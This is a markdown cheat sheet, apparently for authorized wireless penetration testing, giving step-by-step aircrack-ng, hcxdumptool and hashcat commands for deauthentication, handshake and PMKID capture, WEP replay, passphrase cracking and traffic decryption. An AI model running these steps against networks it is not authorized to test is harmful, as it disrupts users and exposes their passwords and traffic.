# Aircrack-ng Adapter Prep & Capture Workflows

## Adapter Preparation Checklist

Before using the suite, confirm:

- chipset supports **monitor mode**
- injection works if deauth or replay is needed
- NetworkManager / wpa_supplicant are not interfering with the interface

Typical prep:

```bash
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Verify monitor interface:

```bash
iw dev
```

Validate injection before depending on replay or deauth workflows:

```bash
sudo aireplay-ng -9 wlan0mon
```

If `aireplay-ng` cannot find the BSSID or waits forever, make sure the card is fixed on the target channel and that another tool is not hopping channels.

## WPA/WPA2 Handshake Workflow

```bash
# discover
airodump-ng wlan0mon

# lock to target
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# force reauth if client present
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# crack later
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

Use deauth only when you have explicit authorization and the test objective requires it.

If no clients are visible, a short broadcast deauth can sometimes make associated stations reappear and can also help reveal hidden ESSIDs when a client reconnects.

## WEP Workflow

```bash
airodump-ng -c 11 --bssid <BSSID> -w wep wlan0mon
aireplay-ng -3 -b <BSSID> wlan0mon
aircrack-ng wep-01.cap
```

WEP attacks are mostly legacy assessment cases.

## Fake Authentication Caveats

`aireplay-ng --fakeauth` is useful for **WEP** open/shared-key association when you need an associated MAC for injection. It is not a WPA/WPA2 authentication step.

Useful pattern for APs that require periodic reassociation / keepalives:

```bash
aireplay-ng -1 30 -e TargetSSID -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
```

Common reasons fake auth fails:
- wrong channel
- wrong ESSID / BSSID
- MAC access controls
- AP deauthing non-associated stations
- card can hear beacons but cannot inject reliably

## PMKID Workflow

PMKID is often more reliable than waiting for a client handshake, but uses companion tooling outside the core aircrack suite.

```bash
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o hashes.22000
hashcat -m 22000 hashes.22000 wordlist.txt
```

## Precomputed PMK Database Workflow

When you expect to test many passphrases against the same ESSID, precomputing PMKs can save time:

```bash
echo "TargetSSID" > essid.txt
airolib-ng target.sqlite --import essid essid.txt
airolib-ng target.sqlite --import passwd wordlist.txt
airolib-ng target.sqlite --batch
aircrack-ng -r target.sqlite capture-01.cap
```

`airolib-ng` ignores passwords outside the valid WPA passphrase range of 8 to 63 characters.

## Post-Recovery Decryption

After recovering a WEP or WPA credential, decrypt traffic for protocol analysis:

```bash
airdecap-ng -b AA:BB:CC:DD:EE:FF -e TargetSSID -p recovered-pass capture-01.cap
tshark -r capture-01-dec.cap
```

For WEP in Wireshark GUI, add the key under `IEEE 802.11` decryption preferences using the hex form of the key.

## Common Failure Points

| Symptom | Likely cause | Fix |
|---|---|---|
| No APs appear | driver/monitor issue | check chipset, try another adapter |
| Deauth has no effect | no injection or PMF/MFP present | verify adapter, test passive methods |
| Fake auth loops or gets deauthed | not really associated | lock channel, verify ESSID/BSSID, reassociate periodically |
| Capture file useless | wrong channel or weak signal | lock channel and move closer |
| Crack never succeeds | weak wordlist fit | tune wordlist/rules or stop wasting cycles |

## Practical Priorities

1. Passive discovery first
2. Identify target channel / security / client presence
3. Prefer least disruptive capture path
4. Save captures for offline review and repeatability

## Source Pointers

- Aircrack-ng suite usage patterns
- PMKID workflows commonly paired with hcxdumptool/hcxpcapngtool
